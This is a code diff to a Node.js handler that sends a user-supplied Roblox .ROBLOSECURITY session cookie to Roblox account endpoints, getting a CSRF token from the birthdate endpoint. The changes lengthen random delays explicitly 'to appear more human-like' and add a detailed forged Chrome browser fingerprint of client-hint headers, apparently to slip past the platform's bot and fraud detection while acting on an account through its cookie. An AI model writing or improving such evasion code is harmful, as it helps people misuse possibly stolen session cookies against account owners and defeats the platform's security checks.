@@ -25,24 +25,40 @@ module.exports = async function handler(req, res) {
     });
   }
 
-  // Add small delay to appear more human-like
-  await delay(1000 + Math.random() * 1000);
+  // Add delay to appear more human-like
+  await delay(2000 + Math.random() * 3000);
 
   let csrfToken = null;
   const baseHeaders = {
     'Cookie': `.ROBLOSECURITY=${cookie}`,
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
     'Accept': 'application/json, text/plain, */*',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.9,en-GB;q=0.8',
+    'Accept-Encoding': 'gzip, deflate, br, zstd',
     'Referer': 'https://www.roblox.com/my/account#!/info',
     'Origin': 'https://www.roblox.com',
     'DNT': '1',
     'Connection': 'keep-alive',
     'Sec-Fetch-Dest': 'empty',
     'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-site',
-    'TE': 'trailers'
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-GPC': '1',
+    'Pragma': 'no-cache',
+    'Cache-Control': 'no-cache',
+    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform-version': '"15.0.0"',
+    'sec-ch-ua-arch': '"x86"',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-bitness': '"64"',
+    'sec-ch-ua-full-version': '"131.0.6778.108"',
+    'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.108", "Chromium";v="131.0.6778.108", "Not_A Brand";v="24.0.0.0"',
+    'sec-ch-ua-wow64': '?0',
+    'upgrade-insecure-requests': '1',
+    'viewport-width': '1920',
+    'x-client-data': 'CIe2yQEIorbJAQipncoBCKmdygEIlKHKAQiVocoB',
+    'x-same-domain': '1'
   };
 
   // Try to get CSRF token from the birthdate endpoint first
@@ -119,7 +135,7 @@ module.exports = async function handler(req, res) {
   }
 
   // Add delay before main request
-  await delay(1500 + Math.random() * 1000);
+  await delay(3000 + Math.random() * 2000);
 
   try {
     const response = await rp({
